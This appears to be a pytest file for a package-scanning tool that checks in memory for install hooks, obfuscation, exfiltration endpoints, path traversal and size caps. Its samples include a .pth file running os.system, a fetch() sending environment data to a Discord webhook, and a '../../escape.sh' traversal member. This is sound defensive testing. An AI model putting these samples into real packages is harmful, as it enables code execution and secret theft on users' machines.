"""Level 2 reading rules: deterministic, in memory, never extracted or run."""

from __future__ import annotations

import io
import tarfile
import zipfile

from threat_lab import rules
from threat_lab.fixtures import fixture_package


def _tar(files: dict) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, text in files.items():
            data = text.encode() if isinstance(text, str) else text
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def test_the_fixture_package_fires_every_rule():
    report = rules.read_artifact(fixture_package())
    assert report.files_read == 3
    assert [hook["hook"] for hook in report.install_hooks] == ["npm:postinstall"]
    assert [entry["path"] for entry in report.obfuscated] == ["package/index.js"]
    assert [entry["path"] for entry in report.suspicious_iocs] == ["package/index.js"]
    assert "203.0.113.7" in report.hosts


def test_a_plain_package_fires_nothing():
    report = rules.read_artifact(_tar({"package/package.json": '{"name":"ok","scripts":{"test":"jest"}}',
                                       "package/index.js": "module.exports = 1;\n"}))
    assert not (report.install_hooks or report.obfuscated or report.suspicious_iocs)


def test_python_install_hooks_are_found_in_a_sdist_and_a_wheel():
    sdist = rules.read_artifact(_tar({"pkg-1.0/setup.py": "from setuptools import setup\nsetup(cmdclass={'install': X})"}))
    assert [hook["hook"] for hook in sdist.install_hooks] == ["setup.py"]
    wheel = io.BytesIO()
    with zipfile.ZipFile(wheel, "w") as archive:
        archive.writestr("evil.pth", "import os; os.system('id')")
    assert [hook["hook"] for hook in rules.read_artifact(wheel.getvalue()).install_hooks] == ["pth"]


def test_exfiltration_endpoints_are_flagged():
    report = rules.read_artifact(b"fetch('https://discord.com/api/webhooks/1/abc', {body: env})")
    assert report.suspicious_iocs and report.files_read == 1


def test_a_traversal_path_is_only_read_never_written(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    report = rules.read_artifact(_tar({"../../escape.sh": "echo pwned"}))
    assert report.files_read == 1
    assert list(tmp_path.iterdir()) == []


def test_an_archive_past_the_member_cap_is_marked_truncated(monkeypatch):
    monkeypatch.setattr(rules, "MAX_MEMBERS", 2)
    report = rules.read_artifact(_tar({f"f{index}.js": "x" for index in range(5)}))
    assert report.truncated and report.files_read == 2


def test_an_oversized_file_is_read_up_to_its_cap(monkeypatch):
    monkeypatch.setattr(rules, "MAX_FILE_BYTES", 10)
    report = rules.read_artifact(_tar({"big.js": "y" * 100}))
    assert report.truncated and report.files_read == 1
